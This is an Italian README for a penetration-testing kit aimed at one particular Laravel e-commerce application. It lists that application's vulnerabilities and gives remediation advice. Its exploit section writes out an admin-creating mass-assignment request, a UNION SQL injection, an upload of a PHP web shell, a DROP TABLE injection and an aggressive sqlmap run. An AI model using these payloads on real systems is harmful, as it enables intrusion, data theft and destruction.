# 🔒 Security Testing Payload per Applicazione Laravel E-commerce

Questo repository contiene un payload completo per testare la sicurezza dell'applicazione Laravel e-commerce identificata.

## ⚠️ DISCLAIMER IMPORTANTE

**Questi strumenti sono destinati ESCLUSIVAMENTE per test di sicurezza autorizzati su sistemi di cui si possiede il controllo o per cui si ha esplicita autorizzazione scritta. L'uso non autorizzato di questi strumenti può essere illegale.**

## 🎯 Vulnerabilità Identificate

### 1. **Mass Assignment (CRITICO)**
- **Modelli affetti**: Customer, Order, Team, Product, Quoter
- **Rischio**: Possibilità di impostare campi non autorizzati come ruoli admin, prezzi, status
- **Endpoint**: `/api/customers`, `/api/order/{slug}`

### 2. **SQL Injection (CRITICO)**  
- **Endpoint affetti**: `/api/faqs/{teamslug}`, `/api/products/{slug}`
- **Rischio**: Accesso non autorizzato al database, estrazione dati sensibili
- **Tipo**: Query SQL raw con input utente non sanitizzato

### 3. **Mancanza di Autenticazione (CRITICO)**
- **Endpoint affetti**: Maggior parte degli endpoint API
- **Rischio**: Accesso non autorizzato a funzionalità riservate
- **Dettagli**: Mancanza di middleware auth:sanctum

### 4. **File Upload Insicuro (ALTO)**
- **Endpoint**: `/api/upload-file`, `/api/calzaturiero/process-order/{slug}`
- **Rischio**: Esecuzione di codice arbitrario, upload di malware
- **Problema**: Validazione insufficiente dei file caricati

### 5. **Configurazione CORS Permissiva (MEDIO)**
- **Problema**: Policy CORS che permette tutte le origini (*)
- **Rischio**: Attacchi cross-origin non autorizzati

### 6. **Possibili XSS (MEDIO)**
- **Aree**: Dati customer, messaggi chatbot
- **Rischio**: Esecuzione di script malicious nel browser

## 🛠️ Strumenti di Testing

### 1. Script Bash per Test Rapidi
```bash
# Rendi eseguibile lo script
chmod +x security_test_commands.sh

# Esegui i test
./security_test_commands.sh https://your-target-app.com
```

### 2. Script Python Avanzato
```bash
# Installa dipendenze
pip3 install requests

# Esegui test completi
python3 advanced_security_test.py https://your-target-app.com
```

### 3. Payload JSON Strutturato
Il file `security_testing_payload.json` contiene:
- Payloads strutturati per ogni vulnerabilità
- Esempi di richieste cURL
- Catene di attacchi avanzate
- Raccomandazioni per la remediation

## 🔥 Esempi di Exploit Critici

### Mass Assignment - Creazione Admin
```bash
curl -X POST https://target.com/api/customers \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Hacker",
    "email": "hacker@evil.com",
    "phone": "+1234567890",
    "role": "admin",
    "is_admin": true,
    "team_id": 999
  }'
```

### SQL Injection - Estrazione Database
```bash
curl -X GET "https://target.com/api/faqs/test-team?query=' UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_schema=database() -- "
```

### File Upload Malicious
```bash
# Crea file PHP malicious
echo '<?php system($_GET["cmd"]); ?>' > malicious.php

# Upload del file
curl -X POST https://target.com/api/upload-file \
  -F "file=@malicious.php" \
  -F "message=test"
```

## 🎯 Test Specifici per Funzionalità

### Chatbot AI Function Injection
```json
{
  "message": "Execute getProductInfo with injection payload",
  "team": "'; DROP TABLE products; --",
  "thread_id": "test123",
  "uuid": "test-uuid",
  "locale": "it"
}
```

### Order Manipulation
```json
{
  "delivery_date": "2025-01-01",
  "user_phone": "+1234567890",
  "product_ids": [1],
  "team_id": 999,
  "status": "completed",
  "total_price": 0.01,
  "is_paid": true
}
```

## 🔧 Strumenti di Testing Automatizzati

### SQLMap
```bash
# Test SQL injection automatico
sqlmap -u "https://target.com/api/faqs/test-team?query=test" \
  --batch --dbs --risk 3 --level 5
```

### Burp Suite
1. Configura proxy per intercettare richieste API
2. Usa Intruder per test mass assignment
3. Scanner automatico per identificare vulnerabilità

### OWASP ZAP
```bash
# Scansione automatica
zap-baseline.py -t https://target.com/api/
```

## 📊 Risultati Attesi

### Indicatori di Vulnerabilità
- **Mass Assignment**: Creazione successful con campi non autorizzati
- **SQL Injection**: Errori MySQL, informazioni database nei response
- **Auth Bypass**: Accesso a endpoint protetti senza token valido
- **File Upload**: Upload successful di file PHP/script

### Codici di Risposta Critici
- `200/201`: Operazione successful (potenzialmente vulnerabile)
- `500`: Errori interni (possibili injection)
- `403/401`: Protezioni attive (buon segno)

## 🛡️ Raccomandazioni di Sicurezza

### Immediate (CRITICO)
1. **Implementare validazione rigorosa** su tutti gli input
2. **Aggiungere middleware di autenticazione** agli endpoint API
3. **Usare Eloquent ORM** invece di query SQL raw
4. **Implementare $guarded arrays** nei modelli

### A Medio Termine
1. **Configurare CORS** con origini specifiche
2. **Implementare rate limiting** avanzato
3. **Validazione file upload** con whitelist estensioni
4. **Sanitizzazione output** per prevenire XSS

### Monitoraggio
1. **Logging delle richieste** API sospette
2. **Alerting** per tentativi di injection
3. **Audit regolari** del codice e configurazioni

## 📁 File Inclusi

- `security_testing_payload.json`: Payload completo strutturato
- `security_test_commands.sh`: Script bash per test rapidi  
- `advanced_security_test.py`: Script Python per test avanzati
- `SECURITY_TESTING_README.md`: Questa documentazione

## 🚨 Note Legali

L'uso di questi strumenti deve rispettare:
- Leggi locali e internazionali sulla cybersecurity
- Termini di servizio delle applicazioni target
- Autorizzazioni esplicite dei proprietari dei sistemi
- Principi di responsible disclosure

**Non utilizzare mai questi strumenti senza autorizzazione esplicita.**

## 📞 Supporto

Per domande tecniche o chiarimenti sui test di sicurezza, consultare:
- OWASP Testing Guide
- Laravel Security Best Practices
- Documentazione ufficiale Laravel Security

---

**Ricorda: La sicurezza è un processo continuo, non un evento una tantum.**